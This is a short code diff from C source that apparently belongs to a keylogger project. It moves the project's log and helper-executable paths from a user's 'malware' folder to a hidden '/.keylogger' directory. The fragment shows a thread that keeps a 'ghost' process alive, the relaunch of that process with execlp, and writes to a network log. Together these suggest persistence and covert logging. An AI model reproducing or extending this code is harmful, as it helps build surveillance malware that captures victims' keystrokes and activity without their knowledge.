@@ -37,7 +37,7 @@ int main(int argc, char **argv)
     pthread_t aliver;
     pthread_create(&aliver, &attr, keep_ghost_alive, &id);
 
-    FILE *network_log = fopen("/home/matgrioni/malware/log/network.txt", "a");
+    FILE *network_log = fopen("/.keylogger/log/network.txt", "a");
     if (network_log == NULL)
     {
         printf("Error opening network log. Exiting...");
@@ -119,7 +119,7 @@ pid_t exec_ghost()
         sprintf(str_id, "%d", parent_id);
 
         printf("Starting ghost...\n");
-        execlp("/home/matgrioni/malware/./ghost", "./ghost", str_id, NULL);
+        execlp("/.keylogger/./ghost", "./ghost", str_id, NULL);
     }
 
     return id;
